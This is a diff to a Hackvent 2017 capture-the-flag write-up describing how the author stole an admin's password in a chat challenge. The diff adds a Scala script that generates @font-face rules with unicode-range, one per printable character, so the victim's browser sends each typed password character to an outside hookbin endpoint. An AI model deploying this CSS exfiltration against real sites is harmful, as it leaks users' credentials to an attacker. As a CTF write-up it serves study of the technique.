@@ -30,8 +30,44 @@ The first hint indicated that it is possible to invite admin to my private chann
 
 The second hint about fonts sent me to the right direction and I found this [article](http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html) about @font-face unicode-range vulnerability.
 
-I downloaded original chatterbox CSS and added section like this for each printable character.
+I downloaded [original](files/styles-original.css "styles-original.css") chatterbox CSS.
 
+```bash
+$ wget -O styles-original.css -q http://challenges.hackvent.hacking-lab.com:1087/css/styles.css
+$ dos2unix -q styles-original.css
+``` 
+
+Then I created my [modified](files/styles-pwned.css "styles-pwned.css") version with this Scala script:
+
+```scala
+val cssOriginal = Paths.get("hackvent2017/challenges/day24/files/styles-original.css")
+val cssPwned = Paths.get("hackvent2017/challenges/day24/files/styles-pwned.css")
+val endpoint = "https://hookb.in/E5V2ANXB"
+
+val writer = Files.newBufferedWriter(cssPwned)
+try {
+  writer.append(ascii(Files.readAllBytes(cssOriginal)))
+  for (ch <- '!' to '~') {
+    writer.append(s"""
+      |@font-face { /* '${ch}' */
+      |    font-family: pwn;
+      |    src: url("${endpoint}?char=${URLEncoder.encode(ch.toString, "UTF-8")}");
+      |    unicode-range: U+${hex(ch.toInt, 4).toUpperCase};
+      |}
+      |""".stripMargin)
+  }
+  writer.append(s"""
+    |#password {
+    |    font-family: pwn;
+    |}
+    |""".stripMargin)
+} finally {
+  writer.close
+}
+``` 
+
+It defines my own fictional `pwn` font family which uses hookbin to capture requests for individual characters by adding section like this for each printable character.
+                                                                                                                         
 ```css
 @font-face { /* 'a' */
     font-family: pwn;
@@ -40,17 +76,13 @@ I downloaded original chatterbox CSS and added section like this for each printa
 }
 ``` 
 
-It defines my own fictional `pwn` font family and uses hookbin to capture requests for individual characters.
-
-The last step was to add this font family to HTML element `password`.
+In last step it adds this font family to the `password` HTML element.
 
 ```css
 #password {
     font-family: pwn;
 }
 ```
-
-Complete CSS code can be found [here](files/styles-pwn.css).
 
 Then I invited admin to my channel with this CSS and checked requests captured in my hookbin.
 
